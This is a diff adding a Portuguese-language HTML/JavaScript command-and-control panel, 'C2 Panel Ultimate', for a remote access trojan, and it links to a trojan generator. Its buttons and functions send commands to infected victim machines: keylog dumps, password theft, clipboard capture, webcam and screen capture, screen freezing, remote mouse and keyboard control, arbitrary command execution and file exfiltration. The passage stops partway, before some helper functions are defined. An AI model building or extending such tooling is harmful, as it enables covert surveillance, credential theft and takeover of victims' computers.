@@ -1,0 +1,850 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<title>C2 Panel Ultimate - Controle Total</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+:root {
+    --primary: #00ff99;
+    --secondary: #ff0040;
+    --dark: #0a0a0a;
+    --darker: #050505;
+    --gray: #1a1a1a;
+}
+
+body {
+    min-height: 100vh;
+    background: linear-gradient(135deg, var(--darker) 0%, #0a1a0a 50%, var(--darker) 100%);
+    color: #fff;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    overflow-x: hidden;
+}
+
+.background {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    background: radial-gradient(circle at 20% 50%, rgba(0,255,153,0.05) 0%, transparent 50%);
+}
+
+.container {
+    display: grid;
+    grid-template-columns: 320px 1fr 340px;
+    gap: 12px;
+    padding: 15px;
+    min-height: 100vh;
+    position: relative;
+    z-index: 1;
+}
+
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: var(--gray); border-radius: 3px; }
+::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 3px; }
+
+/* Sidebar */
+.sidebar {
+    background: rgba(0,0,0,0.85);
+    backdrop-filter: blur(10px);
+    border-radius: 15px;
+    border: 1px solid rgba(0,255,153,0.3);
+    padding: 15px;
+}
+
+.sidebar-header {
+    text-align: center;
+    margin-bottom: 15px;
+    padding-bottom: 10px;
+    border-bottom: 1px solid rgba(0,255,153,0.3);
+}
+
+.sidebar-header h1 {
+    font-family: 'Press Start 2P';
+    font-size: 11px;
+    color: var(--primary);
+}
+
+.c2-status {
+    background: var(--gray);
+    padding: 10px;
+    border-radius: 8px;
+    margin-bottom: 15px;
+    text-align: center;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+}
+
+.status-led {
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    background: #ff0040;
+    animation: blink 1s infinite;
+}
+
+@keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+}
+
+.user-info {
+    background: linear-gradient(135deg, var(--gray), var(--darker));
+    padding: 12px;
+    border-radius: 10px;
+    margin-bottom: 15px;
+    border-left: 3px solid var(--primary);
+}
+
+.user-name { font-size: 13px; font-weight: bold; color: var(--primary); }
+.user-email { font-size: 10px; color: #888; word-break: break-all; }
+.api-key {
+    background: var(--darker);
+    padding: 8px;
+    border-radius: 5px;
+    font-family: monospace;
+    font-size: 9px;
+    color: #ff0040;
+    margin-top: 8px;
+    cursor: pointer;
+    text-align: center;
+}
+
+.nav-buttons {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 15px;
+}
+
+.nav-btn {
+    flex: 1;
+    padding: 10px;
+    background: var(--gray);
+    border: 1px solid rgba(0,255,153,0.3);
+    border-radius: 8px;
+    color: #fff;
+    cursor: pointer;
+    font-size: 10px;
+    text-align: center;
+    transition: all 0.3s;
+}
+
+.nav-btn:hover { border-color: var(--primary); background: rgba(0,255,153,0.1); }
+
+.stats {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 8px;
+    margin-bottom: 15px;
+}
+
+.stat-card {
+    background: var(--gray);
+    padding: 10px;
+    border-radius: 8px;
+    text-align: center;
+}
+
+.stat-value { font-size: 18px; font-weight: bold; color: var(--primary); }
+.stat-label { font-size: 9px; color: #888; }
+
+.device-list {
+    max-height: 300px;
+    overflow-y: auto;
+}
+
+.device {
+    padding: 12px;
+    margin-bottom: 8px;
+    background: var(--gray);
+    border: 1px solid rgba(255,255,255,0.05);
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.2s;
+}
+
+.device:hover { transform: translateX(5px); border-color: var(--primary); }
+.device.active { border-color: var(--primary); background: rgba(0,255,153,0.1); }
+.device.online { border-left: 3px solid var(--primary); }
+.device.offline { border-left: 3px solid var(--secondary); opacity: 0.6; }
+
+.device-name { font-size: 12px; font-weight: bold; }
+.device-info { font-size: 9px; color: #888; margin-top: 5px; }
+.device-badge { font-size: 8px; display: inline-block; padding: 2px 5px; border-radius: 3px; margin-left: 5px; }
+.badge-frozen { background: #00ced1; color: #000; }
+.badge-control { background: #ff69b4; color: #000; }
+
+/* Center Frame */
+.center-area { display: flex; flex-direction: column; gap: 12px; }
+.frame {
+    background: #000;
+    border: 1px solid rgba(0,255,153,0.3);
+    border-radius: 15px;
+    position: relative;
+    min-height: 400px;
+    overflow: hidden;
+}
+
+.frame-title {
+    position: absolute;
+    top: 10px;
+    left: 15px;
+    font-size: 9px;
+    color: #888;
+    font-family: monospace;
+    z-index: 2;
+}
+
+#screen {
+    width: 100%;
+    height: 100%;
+    min-height: 400px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    gap: 15px;
+    padding: 20px;
+}
+
+.screenshot-img {
+    max-width: 100%;
+    max-height: 350px;
+    border-radius: 8px;
+    border: 1px solid var(--primary);
+    cursor: crosshair;
+}
+
+/* Tabs */
+.tabs { display: flex; gap: 5px; }
+.tab-btn {
+    flex: 1;
+    padding: 10px;
+    background: var(--gray);
+    border: 1px solid rgba(255,255,255,0.1);
+    color: #fff;
+    cursor: pointer;
+    border-radius: 8px;
+    font-size: 10px;
+    transition: all 0.2s;
+}
+.tab-btn.active { background: var(--primary); color: #000; border-color: var(--primary); }
+
+/* Panels */
+.panel {
+    background: #000;
+    border: 1px solid rgba(0,255,153,0.2);
+    border-radius: 10px;
+    padding: 12px;
+    max-height: 300px;
+    overflow-y: auto;
+    display: none;
+}
+.panel.active-panel { display: block; }
+
+.terminal-line { font-family: monospace; font-size: 10px; margin: 3px 0; color: var(--primary); }
+.file-item {
+    padding: 8px;
+    border-bottom: 1px solid rgba(255,255,255,0.05);
+    cursor: pointer;
+    display: flex;
+    justify-content: space-between;
+    font-size: 11px;
+}
+.file-item:hover { background: rgba(0,255,153,0.1); }
+
+/* Keyboard */
+.keyboard-container {
+    background: rgba(0,0,0,0.9);
+    border: 1px solid rgba(0,255,153,0.3);
+    border-radius: 10px;
+    padding: 8px;
+}
+.keyboard-row { display: flex; gap: 2px; justify-content: center; flex-wrap: wrap; margin-bottom: 2px; }
+.key {
+    background: var(--gray);
+    border: 1px solid #333;
+    border-radius: 4px;
+    color: #ccc;
+    padding: 6px 4px;
+    font-size: 8px;
+    cursor: pointer;
+    min-width: 32px;
+    text-align: center;
+}
+.key:hover { background: var(--primary); color: #000; }
+.key.space { min-width: 180px; }
+
+/* Keylogger */
+.keylogger-container {
+    background: rgba(0,0,0,0.95);
+    border: 1px solid rgba(0,255,153,0.3);
+    border-radius: 10px;
+    padding: 10px;
+}
+.keylogger-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
+.keylogger-display {
+    background: #000;
+    border: 1px solid #333;
+    border-radius: 5px;
+    padding: 8px;
+    font-family: monospace;
+    font-size: 9px;
+    color: var(--primary);
+    max-height: 120px;
+    overflow-y: auto;
+}
+
+/* Actions Panel */
+.actions-panel {
+    background: rgba(0,0,0,0.85);
+    backdrop-filter: blur(10px);
+    border-radius: 15px;
+    border: 1px solid rgba(0,255,153,0.3);
+    padding: 15px;
+}
+
+.action-buttons {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 8px;
+    margin-bottom: 15px;
+}
+
+.btn {
+    padding: 10px;
+    border: none;
+    border-radius: 8px;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 10px;
+    transition: all 0.2s;
+}
+.btn:hover { transform: translateY(-2px); filter: brightness(1.1); }
+
+.btn-green { background: var(--primary); color: #000; }
+.btn-red { background: var(--secondary); color: #fff; }
+.btn-blue { background: #0088ff; color: #fff; }
+.btn-purple { background: #9b59b6; color: #fff; }
+.btn-orange { background: #e67e22; color: #fff; }
+.btn-yellow { background: #FFD700; color: #000; }
+.btn-cyan { background: #00ced1; color: #000; }
+.btn-pink { background: #ff69b4; color: #000; }
+
+.command-input textarea {
+    width: 100%;
+    padding: 8px;
+    background: var(--gray);
+    border: 1px solid #333;
+    border-radius: 8px;
+    color: #fff;
+    font-family: monospace;
+    font-size: 10px;
+    resize: vertical;
+}
+
+/* Mouse Control Overlay */
+.mouse-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: transparent;
+    z-index: 9999;
+    cursor: crosshair;
+    display: none;
+}
+
+.mouse-control-active {
+    cursor: crosshair;
+}
+
+.notification {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background: var(--gray);
+    border-left: 3px solid var(--primary);
+    padding: 12px 20px;
+    border-radius: 8px;
+    z-index: 1000;
+    animation: slideIn 0.3s ease;
+    display: none;
+}
+
+@keyframes slideIn {
+    from { transform: translateX(100%); opacity: 0; }
+    to { transform: translateX(0); opacity: 1; }
+}
+
+@media (max-width: 1000px) {
+    .container { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+<div class="background"></div>
+<div id="mouseOverlay" class="mouse-overlay"></div>
+
+<div class="container">
+    <!-- Sidebar -->
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <h1><i class="fas fa-skull"></i> C2 PANEL ULTIMATE <i class="fas fa-biohazard"></i></h1>
+        </div>
+        
+        <div class="c2-status">
+            <div class="status-led" id="wsLed"></div>
+            <span id="wsStatus">CONECTANDO...</span>
+        </div>
+        
+        <div class="user-info">
+            <div class="user-name"><i class="fas fa-user"></i> <span id="userName">Carregando...</span></div>
+            <div class="user-email"><i class="fas fa-envelope"></i> <span id="userEmail">-</span></div>
+            <div class="api-key" id="apiKeyDisplay" onclick="copyApiKey()">
+                <i class="fas fa-key"></i> <span id="apiKeyText">Clique para copiar</span>
+            </div>
+        </div>
+        
+        <div class="nav-buttons">
+            <button class="nav-btn" onclick="refreshDevices()"><i class="fas fa-sync-alt"></i> REFRESH</button>
+            <button class="nav-btn" onclick="window.location.href='trojan_generator.html'"><i class="fas fa-plus-circle"></i> GERADOR</button>
+            <button class="nav-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i> SAIR</button>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card"><div class="stat-value" id="totalDevices">0</div><div class="stat-label">Total</div></div>
+            <div class="stat-card"><div class="stat-value" id="onlineDevices">0</div><div class="stat-label">Online</div></div>
+            <div class="stat-card"><div class="stat-value" id="cmdCount">0</div><div class="stat-label">Comandos</div></div>
+        </div>
+        
+        <h1 style="font-size: 9px; margin-bottom: 8px;"><i class="fas fa-microchip"></i> DISPOSITIVOS</h1>
+        <div class="device-list" id="deviceList">
+            <div style="text-align: center; color: #888; padding: 20px;"><i class="fas fa-spinner fa-spin"></i> Aguardando...</div>
+        </div>
+    </div>
+
+    <!-- Center Area -->
+    <div class="center-area">
+        <div class="frame">
+            <div class="frame-title" id="frameTitle">Selecione um dispositivo</div>
+            <div id="screen">
+                <i class="fas fa-plug" style="font-size: 48px; opacity: 0.3;"></i>
+                <p>Conecte-se a um dispositivo para começar</p>
+            </div>
+        </div>
+        
+        <div class="tabs">
+            <button class="tab-btn active" data-tab="screen-tab" onclick="switchTab('screen-tab')"><i class="fas fa-desktop"></i> TELA</button>
+            <button class="tab-btn" data-tab="files-tab" onclick="switchTab('files-tab')"><i class="fas fa-folder"></i> ARQUIVOS</button>
+            <button class="tab-btn" data-tab="terminal-tab" onclick="switchTab('terminal-tab')"><i class="fas fa-terminal"></i> TERMINAL</button>
+            <button class="tab-btn" data-tab="webcam-tab" onclick="switchTab('webcam-tab')"><i class="fas fa-camera"></i> WEBCAM</button>
+        </div>
+        
+        <!-- Files Panel -->
+        <div id="files-tab" class="panel">
+            <div style="display: flex; gap: 5px; margin-bottom: 10px;">
+                <input type="text" id="filePath" placeholder="C:\\" style="flex:1; background: #111; border:1px solid #333; color:#fff; padding:6px; border-radius:5px; font-size:10px;">
+                <button class="btn btn-blue" style="padding:6px 12px;" onclick="listFiles()"><i class="fas fa-search"></i></button>
+                <button class="btn btn-green" style="padding:6px 12px;" onclick="uploadFile()"><i class="fas fa-upload"></i></button>
+            </div>
+            <div id="fileList"></div>
+        </div>
+        
+        <!-- Terminal Panel -->
+        <div id="terminal-tab" class="panel">
+            <div id="terminalOutput" style="font-family: monospace; font-size: 10px; max-height: 200px; overflow-y: auto;"></div>
+            <div style="display: flex; margin-top: 10px;">
+                <span style="color: var(--primary);">$></span>
+                <input type="text" id="terminalInput" style="flex:1; background: transparent; border: none; color: #fff; outline: none; margin-left: 5px; font-size: 10px;" onkeypress="if(event.key==='Enter') sendTerminalCommand()">
+            </div>
+        </div>
+        
+        <!-- Webcam Panel -->
+        <div id="webcam-tab" class="panel" style="text-align: center;">
+            <img id="webcamImage" src="" style="max-width: 100%; border-radius: 8px;">
+            <button class="btn btn-blue" style="margin-top: 10px;" onclick="captureWebcam()"><i class="fas fa-camera"></i> CAPTURAR</button>
+        </div>
+        
+        <!-- Keyboard -->
+        <div class="keyboard-container">
+            <div class="keyboard-row">
+                <div class="key" onclick="sendKey('Esc')">Esc</div><div class="key" onclick="sendKey('F1')">F1</div><div class="key" onclick="sendKey('F2')">F2</div>
+                <div class="key" onclick="sendKey('F3')">F3</div><div class="key" onclick="sendKey('F4')">F4</div><div class="key" onclick="sendKey('F5')">F5</div>
+                <div class="key" onclick="sendKey('F6')">F6</div><div class="key" onclick="sendKey('F7')">F7</div><div class="key" onclick="sendKey('F8')">F8</div>
+                <div class="key" onclick="sendKey('F9')">F9</div><div class="key" onclick="sendKey('F10')">F10</div><div class="key" onclick="sendKey('F11')">F11</div><div class="key" onclick="sendKey('F12')">F12</div>
+            </div>
+            <div class="keyboard-row">
+                <div class="key" onclick="sendKey('`')">`</div><div class="key" onclick="sendKey('1')">1</div><div class="key" onclick="sendKey('2')">2</div>
+                <div class="key" onclick="sendKey('3')">3</div><div class="key" onclick="sendKey('4')">4</div><div class="key" onclick="sendKey('5')">5</div>
+                <div class="key" onclick="sendKey('6')">6</div><div class="key" onclick="sendKey('7')">7</div><div class="key" onclick="sendKey('8')">8</div>
+                <div class="key" onclick="sendKey('9')">9</div><div class="key" onclick="sendKey('0')">0</div><div class="key" onclick="sendKey('-')">-</div>
+                <div class="key" onclick="sendKey('=')">=</div><div class="key" onclick="sendKey('Backspace')">⌫</div>
+            </div>
+            <div class="keyboard-row">
+                <div class="key" onclick="sendKey('Tab')">Tab</div><div class="key" onclick="sendKey('q')">Q</div><div class="key" onclick="sendKey('w')">W</div>
+                <div class="key" onclick="sendKey('e')">E</div><div class="key" onclick="sendKey('r')">R</div><div class="key" onclick="sendKey('t')">T</div>
+                <div class="key" onclick="sendKey('y')">Y</div><div class="key" onclick="sendKey('u')">U</div><div class="key" onclick="sendKey('i')">I</div>
+                <div class="key" onclick="sendKey('o')">O</div><div class="key" onclick="sendKey('p')">P</div><div class="key" onclick="sendKey('[')">[</div>
+                <div class="key" onclick="sendKey(']')">]</div><div class="key" onclick="sendKey('\\')">\\</div>
+            </div>
+            <div class="keyboard-row">
+                <div class="key" onclick="sendKey('CapsLock')">Caps</div><div class="key" onclick="sendKey('a')">A</div><div class="key" onclick="sendKey('s')">S</div>
+                <div class="key" onclick="sendKey('d')">D</div><div class="key" onclick="sendKey('f')">F</div><div class="key" onclick="sendKey('g')">G</div>
+                <div class="key" onclick="sendKey('h')">H</div><div class="key" onclick="sendKey('j')">J</div><div class="key" onclick="sendKey('k')">K</div>
+                <div class="key" onclick="sendKey('l')">L</div><div class="key" onclick="sendKey(';')">;</div><div class="key" onclick="sendKey("'")">'</div>
+                <div class="key" onclick="sendKey('Enter')">↵</div>
+            </div>
+            <div class="keyboard-row">
+                <div class="key" onclick="sendKey('Shift')">Shift</div><div class="key" onclick="sendKey('z')">Z</div><div class="key" onclick="sendKey('x')">X</div>
+                <div class="key" onclick="sendKey('c')">C</div><div class="key" onclick="sendKey('v')">V</div><div class="key" onclick="sendKey('b')">B</div>
+                <div class="key" onclick="sendKey('n')">N</div><div class="key" onclick="sendKey('m')">M</div><div class="key" onclick="sendKey(',')">,</div>
+                <div class="key" onclick="sendKey('.')">.</div><div class="key" onclick="sendKey('/')">/</div><div class="key" onclick="sendKey('Shift')">Shift</div>
+            </div>
+            <div class="keyboard-row">
+                <div class="key" onclick="sendKey('Ctrl')">Ctrl</div><div class="key" onclick="sendKey('Win')">Win</div><div class="key" onclick="sendKey('Alt')">Alt</div>
+                <div class="key space" onclick="sendKey(' ')"> </div><div class="key" onclick="sendKey('Alt')">Alt</div>
+                <div class="key" onclick="sendKey('Ctrl')">Ctrl</div><div class="key" onclick="sendKey('←')">←</div>
+                <div class="key" onclick="sendKey('↓')">↓</div><div class="key" onclick="sendKey('→')">→</div>
+            </div>
+        </div>
+        
+        <!-- Keylogger -->
+        <div class="keylogger-container">
+            <div class="keylogger-header">
+                <span><i class="fas fa-keyboard"></i> KEYLOGGER</span>
+                <div><button class="btn btn-green" style="padding:3px 8px; font-size:9px;" onclick="clearKeylogger()">CLEAR</button>
+                <button class="btn btn-blue" style="padding:3px 8px; font-size:9px;" onclick="exportKeylogger()">EXPORT</button></div>
+            </div>
+            <div class="keylogger-display" id="keyloggerDisplay"></div>
+        </div>
+    </div>
+
+    <!-- Actions Panel -->
+    <div class="actions-panel">
+        <div class="action-buttons">
+            <button class="btn btn-green" onclick="sendRATCommand('screenshot')"><i class="fas fa-camera"></i> SCREEN</button>
+            <button class="btn btn-purple" onclick="sendRATCommand('webcam')"><i class="fas fa-video"></i> WEBCAM</button>
+            <button class="btn btn-blue" onclick="sendRATCommand('keylog_dump')"><i class="fas fa-keyboard"></i> KEYS</button>
+            <button class="btn btn-orange" onclick="sendRATCommand('steal_passwords')"><i class="fas fa-key"></i> PASSWORDS</button>
+            <button class="btn btn-yellow" onclick="sendRATCommand('get_clipboard')"><i class="fas fa-clipboard"></i> CLIPBOARD</button>
+            <button class="btn btn-cyan" id="freezeBtn" onclick="toggleFreezeScreen()"><i class="fas fa-stop-circle"></i> FREEZE</button>
+            <button class="btn btn-pink" id="controlBtn" onclick="toggleControlMode()"><i class="fas fa-mouse-pointer"></i> CONTROLE</button>
+            <button class="btn btn-red" onclick="sendRATCommand('shutdown')"><i class="fas fa-power-off"></i> SHUTDOWN</button>
+        </div>
+        
+        <div class="command-input">
+            <label><i class="fas fa-terminal"></i> COMANDO REMOTO</label>
+            <textarea id="remoteCommand" rows="2" placeholder="ipconfig&#10;whoami&#10;dir C:\\"></textarea>
+            <button class="btn btn-blue" style="margin-top: 5px; width:100%;" onclick="sendRemoteCommand()"><i class="fas fa-paper-plane"></i> EXECUTAR</button>
+        </div>
+        
+        <div style="margin-top: 15px;">
+            <label><i class="fas fa-comment"></i> MENSAGEM POPUP</label>
+            <input type="text" id="popupMessage" style="width:100%; padding:8px; margin-top:5px; background:#111; border:1px solid #333; color:#fff; border-radius:5px;">
+            <button class="btn btn-yellow" style="margin-top:5px; width:100%;" onclick="sendPopupMessage()"><i class="fas fa-comment-dots"></i> ENVIAR</button>
+        </div>
+        
+        <div style="margin-top: 15px;">
+            <label><i class="fas fa-download"></i> DOWNLOAD ARQUIVO</label>
+            <input type="text" id="downloadPath" placeholder="C:\\caminho\\arquivo.txt" style="width:100%; padding:8px; margin-top:5px; background:#111; border:1px solid #333; color:#fff; border-radius:5px;">
+            <button class="btn btn-green" style="margin-top:5px; width:100%;" onclick="downloadRemoteFile()"><i class="fas fa-download"></i> BAIXAR</button>
+        </div>
+    </div>
+</div>
+
+<div id="notification" class="notification"></div>
+
+<script>
+// ============================================================
+// VARIÁVEIS GLOBAIS
+// ============================================================
+let ws = null;
+let currentDevice = null;
+let devices = {};
+let commandCount = 0;
+let userData = null;
+let apiKey = null;
+let isFrozen = false;
+let isControlling = false;
+
+// ============================================================
+// CARREGAR DADOS DO USUÁRIO
+// ============================================================
+function loadUserData() {
+    const user = localStorage.getItem('c2_user');
+    const storedApiKey = localStorage.getItem('c2_api_key');
+    if (!user) { window.location.href = '/login.html'; return; }
+    userData = JSON.parse(user);
+    apiKey = storedApiKey;
+    document.getElementById('userName').innerText = userData.username || userData.email;
+    document.getElementById('userEmail').innerText = userData.email;
+    document.getElementById('apiKeyText').innerText = apiKey ? apiKey.substring(0, 20) + '...' : 'Sem chave';
+    connectWebSocket();
+    loadDevices();
+}
+
+function copyApiKey() {
+    if (apiKey) { navigator.clipboard.writeText(apiKey); showNotification('API Key copiada!', 'success'); }
+}
+
+// ============================================================
+// WEBSOCKET CONNECTION
+// ============================================================
+function connectWebSocket() {
+    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+    ws = new WebSocket(`${protocol}//${window.location.host}`);
+    ws.onopen = () => { document.getElementById('wsLed').style.background = '#00ff99'; document.getElementById('wsStatus').innerText = 'CONECTADO'; };
+    ws.onmessage = (e) => { const data = JSON.parse(e.data); handleWebSocketMessage(data); };
+    ws.onclose = () => { document.getElementById('wsLed').style.background = '#ff0040'; document.getElementById('wsStatus').innerText = 'DESCONECTADO'; setTimeout(connectWebSocket, 5000); };
+}
+
+function handleWebSocketMessage(data) {
+    if (data.type === 'command_completed') addToTerminal(`[CMD ${data.command_id}] ${data.result?.substring(0, 200)}`);
+    else if (data.type === 'new_keylog') addToKeylogger(data.data);
+    else if (data.type === 'new_screenshot') showScreenshot(data.image_data);
+    else if (data.type === 'agent_connected' || data.type === 'agent_disconnected') loadDevices();
+    else if (data.type === 'freeze_screen') { isFrozen = data.frozen; updateFreezeButton(); }
+    else if (data.type === 'set_control') { isControlling = data.controlled; updateControlButton(); }
+}
+
+// ============================================================
+// DISPOSITIVOS
+// ============================================================
+async function loadDevices() {
+    try {
+        const response = await fetch('/api/agents', { headers: { 'email': userData.email, 'api_key': apiKey } });
+        if (response.ok) { const agents = await response.json(); updateDeviceList(agents); }
+    } catch(e) { console.error(e); }
+}
+
+function updateDeviceList(agents) {
+    const deviceList = document.getElementById('deviceList');
+    const onlineCount = agents.filter(a => a.status === 'online').length;
+    document.getElementById('totalDevices').innerText = agents.length;
+    document.getElementById('onlineDevices').innerText = onlineCount;
+    if (agents.length === 0) { deviceList.innerHTML = '<div style="text-align:center;color:#888;padding:20px;"><i class="fas fa-plug"></i> Nenhum dispositivo</div>'; return; }
+    devices = {};
+    deviceList.innerHTML = '';
+    agents.forEach(agent => {
+        devices[agent.agent_id] = agent;
+        const div = document.createElement('div');
+        div.className = `device ${agent.status}`;
+        div.onclick = () => selectDevice(agent.agent_id);
+        let badges = '';
+        if (agent.frozen) badges += '<span class="device-badge badge-frozen"><i class="fas fa-stop-circle"></i> FREEZE</span>';
+        if (agent.controlled) badges += '<span class="device-badge badge-control"><i class="fas fa-mouse-pointer"></i> CTRL</span>';
+        div.innerHTML = `<div class="device-name"><i class="fas fa-${agent.os === 'Windows' ? 'desktop' : 'mobile-alt'}"></i> ${agent.hostname || agent.agent_id.substring(0, 15)} ${badges}</div>
+                        <div class="device-info">${agent.ip || 'N/A'} • ${agent.os || 'Unknown'}</div>`;
+        deviceList.appendChild(div);
+    });
+}
+
+function selectDevice(agentId) {
+    currentDevice = agentId;
+    document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
+    event.target.closest('.device').classList.add('active');
+    document.getElementById('frameTitle').innerText = `${devices[agentId].hostname || agentId} - Conectado`;
+    document.getElementById('screen').innerHTML = `<i class="fas fa-check-circle" style="font-size:48px;color:#00ff99;"></i><p>Conectado a ${devices[agentId].hostname || agentId}</p><p style="font-size:11px;color:#888;">IP: ${devices[agentId].ip || 'N/A'} | OS: ${devices[agentId].os || 'Unknown'}</p>`;
+    isFrozen = devices[agentId].frozen || false;
+    isControlling = devices[agentId].controlled || false;
+    updateFreezeButton();
+    updateControlButton();
+}
+
+function refreshDevices() { loadDevices(); }
+
+// ============================================================
+// FREEZE SCREEN (CONGELAR TELA DA VÍTIMA)
+// ============================================================
+async function toggleFreezeScreen() {
+    if (!currentDevice) { showNotification('Selecione um dispositivo!', 'error'); return; }
+    const newState = !isFrozen;
+    try {
+        const response = await fetch('/api/freeze_screen', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: userData.email, api_key: apiKey, agent_id: currentDevice, frozen: newState })
+        });
+        if (response.ok) {
+            isFrozen = newState;
+            updateFreezeButton();
+            showNotification(`Tela ${newState ? 'CONGELADA' : 'DESCONGELADA'}!`, 'success');
+        }
+    } catch(e) { showNotification('Erro ao congelar tela', 'error'); }
+}
+
+function updateFreezeButton() {
+    const btn = document.getElementById('freezeBtn');
+    if (isFrozen) {
+        btn.innerHTML = '<i class="fas fa-play-circle"></i> DESFREEZE';
+        btn.classList.remove('btn-cyan');
+        btn.classList.add('btn-green');
+    } else {
+        btn.innerHTML = '<i class="fas fa-stop-circle"></i> FREEZE';
+        btn.classList.remove('btn-green');
+        btn.classList.add('btn-cyan');
+    }
+}
+
+// ============================================================
+// CONTROLE NÃO SUPERVISIONADO (MOUSE E TECLADO)
+// ============================================================
+async function toggleControlMode() {
+    if (!currentDevice) { showNotification('Selecione um dispositivo!', 'error'); return; }
+    const newState = !isControlling;
+    try {
+        const response = await fetch('/api/set_control', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: userData.email, api_key: apiKey, agent_id: currentDevice, controlled: newState })
+        });
+        if (response.ok) {
+            isControlling = newState;
+            updateControlButton();
+            if (isControlling) {
+                enableMouseControl();
+                showNotification('Modo de controle ativado! Mova o mouse sobre a tela para controlar.', 'success');
+            } else {
+                disableMouseControl();
+                showNotification('Modo de controle desativado!', 'success');
+            }
+        }
+    } catch(e) { showNotification('Erro ao ativar controle', 'error'); }
+}
+
+function updateControlButton() {
+    const btn = document.getElementById('controlBtn');
+    if (isControlling) {
+        btn.innerHTML = '<i class="fas fa-stop"></i> PARAR CTRL';
+        btn.classList.remove('btn-pink');
+        btn.classList.add('btn-red');
+    } else {
+        btn.innerHTML = '<i class="fas fa-mouse-pointer"></i> CONTROLE';
+        btn.classList.remove('btn-red');
+        btn.classList.add('btn-pink');
+    }
+}
+
+function enableMouseControl() {
+    const overlay = document.getElementById('mouseOverlay');
+    overlay.style.display = 'block';
+    overlay.onmousemove = (e) => sendMouseMove(e.clientX, e.clientY);
+    overlay.onclick = (e) => sendMouseClick(e.clientX, e.clientY, 'left');
+    overlay.oncontextmenu = (e) => { e.preventDefault(); sendMouseClick(e.clientX, e.clientY, 'right'); return false; };
+    document.body.style.cursor = 'crosshair';
+}
+
+function disableMouseControl() {
+    const overlay = document.getElementById('mouseOverlay');
+    overlay.style.display = 'none';
+    overlay.onmousemove = null;
+    overlay.onclick = null;
+    document.body.style.cursor = 'default';
+}
+
+async function sendMouseMove(x, y) {
+    if (!isControlling || !currentDevice) return;
+    const screenImg = document.querySelector('.screenshot-img');
+    if (screenImg) {
+        const rect = screenImg.getBoundingClientRect();
+        const imgX = (x - rect.left) / rect.width;
+        const imgY = (y - rect.top) / rect.height;
+        if (imgX >= 0 && imgX <= 1 && imgY >= 0 && imgY <= 1) {
+            await fetch('/api/send_mouse', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: userData.email, api_key: apiKey, agent_id: currentDevice, x: imgX, y: imgY, button: 'move' })
+            });
+        }
+    }
+}
+
+async function sendMouseClick(x, y, button) {
+    if (!isControlling || !currentDevice) return;
+    const screenImg = document.querySelector('.screenshot-img');
+    if (screenImg) {
+        const rect = screenImg.getBoundingClientRect();
+        const imgX = (x - rect.left) / rect.width;
+        const imgY = (y - rect.top) / rect.height;
+        if (imgX >= 0 && imgX <= 1 && imgY >= 0 && imgY <= 1) {
+            await fetch('/api/send_mouse', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: userData.email, api_key: apiKey, agent_id: currentDevice, x: imgX, y: imgY, button: button })
+            });
+            addToKeylogger(`[Mouse ${button}] em (${Math.round(imgX*100)}%, ${Math.round(imgY*100)}%)`);
+        }
+    }
+}
+
+// ============================================================
+// COMANDOS RAT
+// ============================================================
+async function sendRATCommand(command, data = '') {
+    if (!currentDevice) { showNotification('Selecione um dispositivo!', 'error'); return; }
+    commandCount++; document.getElementById('cmdCount').innerText = commandCount;
+    try {
+        await fetch('/api/send_command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: userData.email, api_key: apiKey, agent_id: currentDevice, command: JSON.stringify({ type: command, data: data }) })
+        });
+        showNotification(`Comando "${command}" enviado!`, 'success');
+    } catch(e) { showNotification('Erro ao enviar comando', 'error'); }
+}
+
+function sendRemoteCommand() { const cmd = document.getElementById('remoteCommand').value; if(cmd) { sendRATCommand('exec', cmd); addToTerminal(`$> ${cmd}`); document.getElementById('remoteCommand').value = ''; } }
+function sendTerminalCommand() { const input = document.getElementById('terminalInput'); const cmd = input.value; if(cmd) { sendRATCommand('exec', cmd); addToTerminal(`$> ${cmd}`); input.value = ''; } }
+function sendKey(key) { sendRATCommand('keypress', key); addToKeylogger(`[Tecla] ${key}`); }
+function captureWebcam() { sendRATCommand('webcam_capture'); }
+function sendPopupMessage() { const msg = document.getElementById('popupMessage').value; if(msg) { sendRATCommand('message', msg); document.getElementById('popupMessage').value = ''; } }
+function downloadRemoteFile() { const path = document.getElementById('downloadPath').value; if(path) sendRATCommand('download_file', path); }
+function listFiles() { const path = document.getElementById('filePath').value || 'C:\\'; sendRATCommand('list_files', path); }
